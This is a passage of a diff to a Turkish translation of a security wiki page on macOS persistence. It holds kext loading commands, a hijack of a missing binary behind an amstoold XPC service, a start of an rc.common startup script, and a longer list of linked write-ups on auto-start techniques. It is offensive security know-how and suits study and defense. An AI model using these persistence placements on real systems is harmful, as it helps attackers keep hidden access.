+Şu anda yüklü olan kext dosyalarını şu komutla listeleyebilirsiniz:
 ```bash
 kextstat #List loaded kext
 kextload /path/to/kext.kext #Load a new one based on path
@@ -1563,9 +1565,9 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.g
 
 #### Açıklama ve Exploitation
 
-Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist`, bir XPC service sunarken bu binary'yi kullanıyordu... Ancak binary mevcut değildi; bu nedenle oraya bir şey yerleştirebilir ve XPC service çağrıldığında binary'nizin çalıştırılmasını sağlayabilirdiniz.
+Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist`, bir XPC service sunarken bu binary'yi kullanıyordu... Sorun şu ki binary mevcut değildi; dolayısıyla buraya bir şey yerleştirebilir ve XPC service çağrıldığında binary'nizin çalıştırılmasını sağlayabilirdiniz.<sup>[35]</sup>
 
-Artık bunu macOS'umda bulamıyorum.
+Bunu artık macOS'umda bulamıyorum.
 
 ### ~~xsanctl~~
 
@@ -1579,13 +1581,13 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.g
 
 #### Açıklama ve exploit
 
-Görünüşe göre bu script'i çalıştırmak pek yaygın değil ve macOS'umda bile bulamadım; bu nedenle daha fazla bilgi istiyorsanız writeup'a göz atın.
+Görünüşe göre bu script'i çalıştırmak pek yaygın değil ve macOS'umda bunu bile bulamadım; bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.<sup>[36]</sup>
 
 ### ~~/etc/rc.common~~
 
 > [!CAUTION] > **Bu, modern MacOS sürümlerinde çalışmıyor**
 
-Buraya **başlangıçta çalıştırılacak komutlar** yerleştirmek de mümkündür. Örneğin normal bir rc.common script'i:
+Buraya **startup sırasında çalıştırılacak komutlar** yerleştirmek de mümkündür. Normal bir rc.common script'i örneği:
 ```bash
 #
 # Common setup for startup scripts.
@@ -1685,6 +1687,41 @@ esac
 
 ## Referanslar
 
-- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [1] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [2] [İyi ol' LaunchAgents'ın ötesinde - 1 - shell startup dosyaları](https://theevilbit.github.io/beyond/beyond_0001/)
+- [3] [İyi ol' LaunchAgents'ın ötesinde - 18 - X11 ve XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
+- [4] [İyi ol' LaunchAgents'ın ötesinde - 21 - Yeniden açılan uygulamalar](https://theevilbit.github.io/beyond/beyond_0021/)
+- [5] [İyi ol' LaunchAgents'ın ötesinde - 20 - Terminal tercihleri](https://theevilbit.github.io/beyond/beyond_0020/)
+- [6] [İyi ol' LaunchAgents'ın ötesinde - 13 - Audio Plugin'leri](https://theevilbit.github.io/beyond/beyond_0013/)
+- [7] [Audio Unit Plugin'leri (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
+- [8] [İyi ol' LaunchAgents'ın ötesinde - 12 - QuickLook Plugin'leri](https://theevilbit.github.io/beyond/beyond_0012/)
+- [9] [İyi ol' LaunchAgents'ın ötesinde - 22 - LoginHook ve LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
+- [10] [İyi ol' LaunchAgents'ın ötesinde - 4 - cron işleri](https://theevilbit.github.io/beyond/beyond_0004/)
+- [11] [İyi ol' LaunchAgents'ın ötesinde - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
+- [12] [İyi ol' LaunchAgents'ın ötesinde - 7 - xbar plugin'leri](https://theevilbit.github.io/beyond/beyond_0007/)
+- [13] [İyi ol' LaunchAgents'ın ötesinde - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
+- [14] [İyi ol' LaunchAgents'ın ötesinde - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
+- [15] [İyi ol' LaunchAgents'ın ötesinde - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
+- [16] [İyi ol' LaunchAgents'ın ötesinde - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
+- [17] [İyi ol' LaunchAgents'ın ötesinde - 24 - Klasör Eylemleri](https://theevilbit.github.io/beyond/beyond_0024/)
+- [18] [macOS'ta Persistence için Klasör Eylemleri (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
+- [19] [İyi ol' LaunchAgents'ın ötesinde - 27 - Dock kısayolları](https://theevilbit.github.io/beyond/beyond_0027/)
+- [20] [İyi ol' LaunchAgents'ın ötesinde - 17 - Renk Seçiciler](https://theevilbit.github.io/beyond/beyond_0017/)
+- [21] [İyi ol' LaunchAgents'ın ötesinde - 26 - Finder Sync Plugin'leri](https://theevilbit.github.io/beyond/beyond_0026/)
+- [22] ["Mac File Opener" Persistence'ını analiz etme (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
+- [23] [İyi ol' LaunchAgents'ın ötesinde - 16 - Ekran Koruyucu](https://theevilbit.github.io/beyond/beyond_0016/)
+- [24] [Erişiminizi koruma: macOS Persistence için ekran koruyucular (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
+- [25] [İyi ol' LaunchAgents'ın ötesinde - 11 - Spotlight Importer'ları](https://theevilbit.github.io/beyond/beyond_0011/)
+- [26] [İyi ol' LaunchAgents'ın ötesinde - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
+- [27] [İyi ol' LaunchAgents'ın ötesinde - 19 - Periyodik Script'ler](https://theevilbit.github.io/beyond/beyond_0019/)
+- [28] [İyi ol' LaunchAgents'ın ötesinde - 5 - Pluggable Authentication Module'leri (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
+- [29] [İyi ol' LaunchAgents'ın ötesinde - 28 - Authorization Plugin'leri](https://theevilbit.github.io/beyond/beyond_0028/)
+- [30] [Authorization Plugin'leri ile kalıcı kimlik bilgisi hırsızlığı (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
+- [31] [İyi ol' LaunchAgents'ın ötesinde - 30 - man yapılandırma dosyası - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
+- [32] [İyi ol' LaunchAgents'ın ötesinde - 25 - Apache2 modülleri](https://theevilbit.github.io/beyond/beyond_0025/)
+- [33] [İyi ol' LaunchAgents'ın ötesinde - 31 - BSM audit framework'ü](https://theevilbit.github.io/beyond/beyond_0031/)
+- [34] [İyi ol' LaunchAgents'ın ötesinde - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
+- [35] [İyi ol' LaunchAgents'ın ötesinde - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
+- [36] [İyi ol' LaunchAgents'ın ötesinde - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
 
 {{#include ../banners/hacktricks-training.md}}
